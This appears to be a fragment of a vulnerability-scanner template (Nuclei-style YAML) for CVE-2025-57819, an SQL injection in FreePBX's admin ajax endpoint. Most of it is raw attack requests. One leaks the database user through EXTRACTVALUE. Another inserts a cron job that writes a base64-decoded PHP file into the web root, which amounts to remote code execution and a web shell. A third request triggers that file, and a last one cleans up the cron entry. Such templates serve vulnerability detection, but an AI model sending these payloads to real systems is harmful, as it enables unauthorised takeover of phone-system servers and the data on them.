  - '{{BaseURL}}/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x''
    AND EXTRACTVALUE(1,CONCAT(''~USER:'',(SELECT USER()),''~'')) -- '
- matchers:
  - dsl:
    - contains(body, 'Whoops') && status_code == 500
    internal: true
    type: dsl
  raw:
  - 'GET /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x''%20;INSERT%20INTO%20cron_jobs%20(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)%20VALUES%20(''sysadmin'',''{{username}}'',''echo%20%22{{cmd}}%22%7Cbase64%20-d%20%3E/var/www/html/{{filename}}.php'',NULL,''*%20*%20*%20*%20*'',30,1,1)%20--%20
    HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - dsl:
    - body
    type: dsl
  matchers:
  - dsl:
    - contains(x_poc, 'CVE-2025-57819')
    name: rce
    type: dsl
  raw:
  - '@timeout: 80s

    GET /{{filename}}.php?x={{wait_for(70)}} HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - dsl:
    - contains(body, 'Whoops') && status_code == 500
    internal: true
    name: cleanup
    type: dsl
  raw:
  - 'GET /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x''%20;DELETE%20FROM%20cron_jobs%20WHERE%20jobname=''{{username}}''%20--%20
    HTTP/1.1

    Host: {{Hostname}}

    '
